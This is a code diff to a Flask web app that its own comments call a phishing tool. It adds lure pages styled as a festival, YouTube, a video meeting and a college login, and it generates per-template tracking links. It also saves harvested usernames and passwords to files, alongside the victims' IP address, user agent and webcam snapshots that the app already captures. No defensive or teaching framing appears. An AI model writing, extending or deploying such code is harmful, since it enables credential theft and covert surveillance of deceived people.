@@ -19,6 +19,23 @@ def capture_page(tracking_id):
     """Show the capture page with the unique ID for tracking"""
     return render_template('index.html', tracking_id=tracking_id)
 
+# Routes for different phishing page templates
+@app.route('/festival/<tracking_id>')
+def festival_page(tracking_id):
+    return render_template('festival.html', tracking_id=tracking_id)
+
+@app.route('/youtube/<tracking_id>')
+def youtube_page(tracking_id):
+    return render_template('youtube.html', tracking_id=tracking_id)
+
+@app.route('/meet/<tracking_id>')
+def meet_page(tracking_id):
+    return render_template('meet.html', tracking_id=tracking_id)
+
+@app.route('/college/<tracking_id>')
+def college_page(tracking_id):
+    return render_template('college.html', tracking_id=tracking_id)
+
 @app.route('/capture', methods=['POST'])
 def capture():
     data = request.json
@@ -30,7 +47,8 @@ def capture():
         'tracking_id': tracking_id,
         'timestamp': timestamp,
         'ip_address': request.remote_addr,
-        'user_agent': request.headers.get('User-Agent')
+        'user_agent': request.headers.get('User-Agent'),
+        'source': data.get('source', 'unknown')
     }
     
     with open(f'captured_data/{tracking_id}_{timestamp}_info.txt', 'w') as f:
@@ -50,6 +68,12 @@ def capture():
         with open(f'captured_data/{tracking_id}_{timestamp}_webcam.jpg', 'wb') as f:
             f.write(base64.b64decode(image_data))
     
+    # Save credentials if provided (college login template)
+    if 'credentials' in data:
+        with open(f'captured_data/{tracking_id}_{timestamp}_credentials.txt', 'w') as f:
+            f.write(f"Username: {data['credentials'].get('username', '')}\n")
+            f.write(f"Password: {data['credentials'].get('password', '')}\n")
+    
     return jsonify({'status': 'success', 'message': 'Data captured successfully'})
 
 @app.route('/consent')
@@ -64,9 +88,21 @@ def admin():
 @app.route('/generate-link')
 def generate_link():
     """Generate a unique phishing link"""
+    template = request.args.get('template', 'default')
     unique_id = str(uuid.uuid4())
-    link = f"{request.host_url}capture/{unique_id}"
-    return render_template('link.html', link=link)
+    
+    if template == 'festival':
+        link = f"{request.host_url}festival/{unique_id}"
+    elif template == 'youtube':
+        link = f"{request.host_url}youtube/{unique_id}"
+    elif template == 'meet':
+        link = f"{request.host_url}meet/{unique_id}"
+    elif template == 'college':
+        link = f"{request.host_url}college/{unique_id}"
+    else:
+        link = f"{request.host_url}capture/{unique_id}"
+    
+    return render_template('link.html', link=link, template=template)
 
 if __name__ == '__main__':
     # Only use ngrok when running in development mode
